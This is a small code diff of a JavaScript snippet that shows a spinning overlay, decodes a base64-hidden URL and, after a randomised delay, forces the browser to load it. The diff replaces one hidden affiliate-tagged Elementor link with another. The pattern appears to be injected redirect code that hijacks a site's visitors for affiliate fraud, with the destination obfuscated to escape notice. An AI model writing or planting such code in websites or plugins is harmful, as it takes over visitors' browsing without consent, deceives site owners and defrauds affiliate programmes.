@@ -16,6 +16,6 @@
   s.textContent="@keyframes r{to{transform:rotate(360deg)}}";
   (document.head||document.documentElement).appendChild(s);
   document.body.appendChild(o);
-  var d=atob("aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2JlLmVsZW1lbnRvci5jb20vdmlzaXQvP2J0YT0yMDQyNTMmYnJhbmQ9ZWxlbWVudG9y");
+  var d=atob("aHR0cHM6Ly9lbGVtZW50b3IuY29tL3BhZ2VzL3BsdWdpbi1zcGVjaWFsLz9jeGQ9MjA0MjUzXzE4NDk2MjkmdXRtX3NvdXJjZT1lbGVtZW50b3ImdXRtX21lZGl1bT1hZmZpbGlhdGUmdXRtX2NhbXBhaWduPTIwNDI1MyZ1dG1fY29udGVudD1jeCZhZmZpZD0yMDQyNTM=");
   setTimeout(function(){window.location.href=d;},300+Math.random()*200);
 })();
